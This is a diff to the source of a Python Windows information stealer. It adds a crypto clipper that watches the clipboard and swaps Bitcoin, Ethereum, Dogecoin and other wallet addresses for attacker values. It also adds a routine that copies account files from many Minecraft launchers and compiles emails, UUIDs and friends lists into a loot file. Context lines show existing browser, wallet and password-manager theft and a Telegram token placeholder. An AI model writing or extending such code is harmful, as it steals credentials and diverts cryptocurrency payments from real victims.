@@ -28,7 +28,6 @@ from cryptography.hazmat.backends import default_backend # type: ignore
 from Crypto.Cipher import DES3, AES # type: ignore
 from Crypto.Protocol.KDF import PBKDF2 # type: ignore
 
-
 TOKEN = "%TOKEN%"
 CHAT_ID = "%CHAT_ID%"
 
@@ -64,6 +63,7 @@ class ListFonction:
     GuildedAccounts = list()
     StakeAccount = list()
     PatreonAccounts = list()
+    MinecraftAccount = list()
 
 class WindowsApi:
     @staticmethod
@@ -120,9 +120,6 @@ class WindowsApi:
                 return str(WindowsApi.CryptUnprotectData(EncrypedValue))
         except:
             return "Decryption Error!, Data cant be decrypt"
-
-
-
 
 class GeckoDecryptionApi:
     def decode_login_data(self, b64):
@@ -1316,6 +1313,59 @@ class get_data:
         except Exception as Error:
             logs_handler(f"Error Stealing Wallets | {str(Error)}")
 
+    async def CryptoClipper(self) -> None:
+        try:
+            async def StealClipboard():
+                try:
+                    process = await asyncio.create_subprocess_shell('powershell -Command Get-Clipboard', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                    stdout, _ = await process.communicate()
+                    return stdout.decode().strip()
+                except Exception:
+                    return ""
+
+            async def SetClipboard(text):
+                try:
+                    await asyncio.create_subprocess_shell(f'powershell -Command "Set-Clipboard -Value \'{text}\'"', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                except Exception:
+                    return
+
+            blockchains = [
+                ("BTC_ADDRESS", re.compile(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$")),
+                ("LTC_ADDRESS", re.compile(r"^(L|M|3)[a-km-zA-HJ-NP-Z1-9]{26,33}$")),
+                ("XLM_ADDRESS", re.compile(r"^G[0-9a-zA-Z]{55}$")),
+                ("XRP_ADDRESS", re.compile(r"^r[0-9a-zA-Z]{24,34}$")),
+                ("BCH_ADDRESS", re.compile(r"^(bitcoincash:)?(q|p)[a-z0-9]{41}$")),
+                ("ETH_ADDRESS", re.compile(r"^0x[a-fA-F0-9]{40}$")),
+                ("NEO_ADDRESS", re.compile(r"^A[0-9a-zA-Z]{33}$")),
+                ("DASH_ADDRESS", re.compile(r"^X[1-9A-HJ-NP-Za-km-z]{33}$")),
+                ("DOGE_ADDRESS", re.compile(r"^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$"))
+            ]
+
+            while True:
+                try:
+                    clipboard_content = await StealClipboard()
+                    modified_text = clipboard_content
+                    detected = False
+
+                    for address_name, pattern in blockchains:
+                        target_address = address_name
+
+                        for line in clipboard_content.splitlines():
+                            if line == target_address:
+                                break
+                            if pattern.match(line):
+                                detected = True
+                                modified_text = modified_text.replace(line, target_address)
+
+                    if detected:
+                        await SetClipboard(modified_text)
+
+                    await asyncio.sleep(1)
+
+                except Exception as Error:
+                    logs_handler(f"Error Launching Crypto Clipper!: {str(Error)}")
+        except Exception as Error:
+            logs_handler(f"Error with Crypto Clipper: {str(Error)}")
 
     async def InjectWallets(self) -> None:
         async def inject(app_path, asar_path, injection_url, license_path=None):
@@ -1975,6 +2025,78 @@ class get_data:
         except Exception as Error:
             logs_handler(f"[ERROR] - getting Steam session: {str(Error)}")
 
+    async def StealMinecraft(self, directory_path) -> None:
+        try:
+            minecraft_paths = [
+                {"name": "NationsGlory", "path": os.path.join(self.appdata, "NationsGlory", "Local Storage", "leveldb")},
+                {"name": "Minecraft", "path": os.path.join(self.appdata, ".minecraft")},
+                {"name": "LunarClient", "path": os.path.join(self.user_home, ".lunarclient", "settings", "game")},
+                {"name": "FeatherClient", "path": os.path.join(self.appdata, ".feather")},
+                {"name": "EssentialClient", "path": os.path.join(self.appdata, ".minecraft", "essential")},
+                {"name": "TLauncher", "path": os.path.join(self.appdata, ".tlauncher", "mcl", "Minecraft", "game")},
+                {"name": "BadlionClient", "path": os.path.join(self.appdata, ".minecraft", "badlion")},
+                {"name": "ATLauncher", "path": os.path.join(self.appdata, ".atlauncher")},
+                {"name": "TechnicLauncher", "path": os.path.join(self.appdata, ".technic")},
+                {"name": "GDLauncher", "path": os.path.join(self.appdata, ".gdlauncher")},
+                {"name": "MultiMC", "path": os.path.join(self.appdata, ".local", "share", "multimc")},
+                {"name": "CurseForge", "path": os.path.join(self.appdata, "curseforge", "minecraft")},
+            ]
+
+            for mc_path in minecraft_paths:
+                client_name = mc_path["name"]
+                path = mc_path["path"]
+                
+                if os.path.exists(path):
+                    target_path = os.path.join(directory_path, client_name)
+                    os.makedirs(target_path, exist_ok=True)
+                    
+                    for root, dirs, files in os.walk(path):
+                        for file in files:
+                            src_file_path = os.path.join(root, file)
+                            dest_file_path = os.path.join(target_path, file)
+                            shutil.copy2(src_file_path, dest_file_path)
+                            print(f"Copied {file} from {client_name} to {target_path}")
+
+            async with aiohttp.ClientSession() as session:
+                for mc_file in Path(directory_path).rglob("*.json"):
+                    try:
+                        with open(mc_file, 'r', encoding='utf-8') as f:
+                            content = f.read()
+                            jsonData = json.loads(content)
+                        
+                        accountInfo = jsonData.get("accounts", {})
+                        if accountInfo:
+                            for accountId, accountData in accountInfo.items():
+                                emailRegex = r"[\w\.-]+@[a-zA-Z\d\.-]+\.[a-zA-Z]{2,}"
+                                emails = re.findall(emailRegex, json.dumps(accountInfo))
+
+                                profile = accountData.get("minecraftProfile")
+                                if profile:
+                                    try:
+                                        async with session.get(f"https://api.hypixel.net/player?key=YOUR_HYPIXEL_API_KEY&uuid={profile['id']}") as hypixel_response:
+                                            hypixel_data = await hypixel_response.json()
+                                    except aiohttp.ClientError:
+                                        hypixel_data = {}
+                                    
+                                    try:
+                                        async with session.get(f"https://api.namemc.com/profile/{profile['id']}/friends") as playerDBResponse:
+                                            if playerDBResponse.status == 200:
+                                                playerDBData = await playerDBResponse.json()
+                                                name = [entry['name'] for entry in playerDBData]
+                                                count = len(name)
+                                            else:
+                                                name = []
+                                                count = 0
+                                    except aiohttp.ClientError:
+                                        name = []
+                                        count = 0
+
+                                    text = f"Minecraft Account\n\nSkins Links: \"https://crafatar.com/skins/{profile['id']}.png\"\nCapes Links: \"https://s.optifine.net/capes/{profile['name']}.png\"\n\nAccount ID: {accountId}\nUsername: {profile['name']}\nEmail: {emails or 'None'}\nMinecraft UID: {profile['id']}\nFriends Count: {count or 0}\nFriends List: {', '.join(name) or 'None'}\nHypixel Rank: {hypixel_data.get('achievementPoints', 'None')}\n====================================================================================\n"
+                                    ListFonction.MinecraftAccount.append(f"{text}\n")
+                    except Exception as error:
+                        logs_handler(f"Error processing file {mc_file}: {str(error)}")
+        except Exception as Error:
+            logs_handler(f"Error getting Minecraft Sessions {str(Error)}")
 
     async def StealUbisoft(self, directory_path: str) -> None:
         try:
@@ -2120,8 +2242,6 @@ class get_data:
             logs_handler(f"[ERROR] - getting BattleNet files: {str(Error)}")
             pass
 
-
-
     async def InsideFolder(self) -> None:
         try:
             hostname = platform.node()
@@ -2232,6 +2352,10 @@ class get_data:
                 with open(os.path.join(filePath, "Sessions", "riot_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     for value in ListFonction.RiotUserAccounts:
                         file.write(value)
+            if ListFonction.MinecraftAccount:
+                with open(os.path.join(filePath, "Sessions", "minecraft_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.MinecraftAccount:
+                        file.write(value)
 
             if len(os.listdir(os.path.join(filePath, "Browsers"))) == 0:
                 try:shutil.rmtree(os.path.join(filePath, "Browsers"))
@@ -2271,6 +2395,7 @@ class get_data:
                 self.BackupMailbird(filePath),
                 self.BackupThunderbird(filePath),
                 self.StealPasswordManagers(filePath),
+                self.StealMinecraft(filePath),
                 self.StealUbisoft(filePath),
                 self.StealEpicGames(filePath),
                 self.StealSteamFiles(filePath),
@@ -2659,5 +2784,6 @@ if __name__ == '__main__':
 
         main = get_data()
         asyncio.run(main.RunAllFonctions())
+        asyncio.run(main.CryptoClipper())
     else:
-        print('run only on windows operating system')
+        print("run only on windows operating system")
